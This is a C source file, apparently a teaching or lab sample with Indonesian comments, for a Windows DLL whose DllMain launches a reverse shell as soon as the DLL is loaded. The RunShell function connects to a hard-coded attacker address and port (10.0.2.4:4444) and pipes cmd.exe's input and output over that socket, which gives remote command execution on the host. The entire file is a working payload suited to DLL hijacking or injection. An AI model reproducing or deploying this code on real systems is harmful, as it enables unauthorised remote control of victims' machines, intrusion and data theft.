#include <winsock2.h>        // Library untuk socket programming pada Windows
#include <windows.h>         // Library utama untuk Windows API
#include <stdio.h>           // Library untuk fungsi input/output
#pragma comment(lib, "ws2_32.lib") // Menambahkan pustaka winsock untuk linkage

// Deklarasi variabel global
WSADATA socketData;                // Struktur untuk menyimpan informasi versi Winsock
SOCKET mainSocket;                 // Variabel untuk menyimpan socket utama
struct sockaddr_in connectionAddress; // Struktur untuk menyimpan alamat koneksi
STARTUPINFO startupInfo;           // Struktur untuk mengatur informasi startup proses baru
PROCESS_INFORMATION processInfo;   // Struktur untuk informasi tentang proses yang berjalan

// Fungsi untuk menjalankan shell remote
void RunShell() {
    // Alamat IP dan port dari mesin yang menerima koneksi
    char *attackerIP = "10.0.2.4"; // Alamat IP dari penyerang
    short attackerPort = 4444;     // Port untuk koneksi

    // Inisialisasi Winsock
    WSAStartup(MAKEWORD(2, 2), &socketData); // Inisialisasi socket untuk versi 2.2

    // Membuat objek socket
    mainSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // Membuat socket TCP

    // Mengatur alamat dan port untuk koneksi
    connectionAddress.sin_family = AF_INET;
    connectionAddress.sin_port = htons(attackerPort); // Mengkonversi port ke big-endian
    connectionAddress.sin_addr.s_addr = inet_addr(attackerIP); // Mengatur alamat IP tujuan

    // Membangun koneksi ke host remote (penyerang)
    WSAConnect(
        mainSocket,                        // Socket yang akan digunakan untuk koneksi
        (SOCKADDR*)&connectionAddress,     // Alamat dari remote host
        sizeof(connectionAddress),         // Ukuran alamat
        NULL, NULL, NULL, NULL             // Parameter tambahan yang diatur ke NULL
    );

    // Mengatur informasi startup untuk proses baru
    memset(&startupInfo, 0, sizeof(startupInfo)); // Menginisialisasi struktur startupInfo dengan nol
    startupInfo.cb = sizeof(startupInfo);         // Mengatur ukuran struktur
    startupInfo.dwFlags = STARTF_USESTDHANDLES;   // Menggunakan handle khusus
    startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE)mainSocket;
    // Menyambungkan input, output, dan error standar ke socket untuk komunikasi dengan cmd.exe

    // Menjalankan cmd.exe dengan aliran yang diarahkan ke socket
    CreateProcess(
        NULL,                    // Nama aplikasi
        "cmd.exe",               // Perintah yang dijalankan (cmd.exe)
        NULL, NULL,              // Atribut keamanan
        TRUE,                    // Menyambungkan aliran standar ke socket
        0,                       // Tidak ada flag khusus
        NULL, NULL,              // Lingkungan dan direktori kerja yang sama
        &startupInfo,            // Struktur informasi startup
        &processInfo             // Struktur yang menyimpan informasi proses baru
    );
}

// Fungsi utama DLL (DllMain), dipanggil setiap kali ada perubahan pada proses atau thread
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Dipanggil saat DLL pertama kali dimuat ke dalam proses
        RunShell(); // Memulai shell remote dengan menjalankan fungsi RunShell
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE; // Mengembalikan TRUE untuk menunjukkan bahwa DLL berhasil dimuat
}
